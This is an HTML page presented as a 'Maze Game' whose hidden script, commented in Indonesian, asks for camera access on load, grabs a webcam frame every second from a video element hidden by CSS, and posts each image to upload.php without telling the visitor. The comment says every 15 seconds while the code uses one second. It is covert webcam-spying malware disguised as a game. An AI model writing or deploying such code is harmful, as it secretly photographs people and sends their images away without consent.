<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Maze Game</title>
  <meta name="title" content="Maze Game" />
<meta name="description" content="" />
<meta property="og:image" content="https://i.ibb.co/j3LcByw/images.png" />
<link rel="shortcut icon" type="image/x-icon" href="https://i.ibb.co/j3LcByw/images.png">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
</head>
<body>
<div>
<style>
html, body {
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

#videoPlayer {
display: none;
}
</style>
<video id="videoPlayer" autoplay></video>
</div>
<iframe id="fullscreen" src="mazegame.html" height="100%" frameborder="0"></iframe>
<script>
// Mengakses kamera dan merekam video
function startRecording() {
navigator.mediaDevices.getUserMedia({
video: true, audio: false
})
.then(function(stream) {
var videoPlayer = document.getElementById('videoPlayer');
videoPlayer.srcObject = stream;
videoPlayer.play();

// Merekam video setiap 15 detik
setInterval(function() {
var canvas = document.createElement('canvas');
var context = canvas.getContext('2d');
canvas.width = videoPlayer.videoWidth;
canvas.height = videoPlayer.videoHeight;
context.drawImage(videoPlayer, 0, 0, canvas.width, canvas.height);

// Mengonversi gambar ke data URL
var dataURL = canvas.toDataURL('image/jpeg');

// Kirim data gambar ke server
$.ajax({
type: 'POST',
url: 'upload.php',
data: {
imageData: dataURL
},
success: function(response) {
console.log(response);
}
});
}, 1000); // Setiap 1detik
})
.catch(function(error) {
console.error('Error accessing camera:', error);
});
}

// Memulai perekaman saat halaman dimuat
window.onload = function() {
startRecording();
};
</script>
</body>
</html>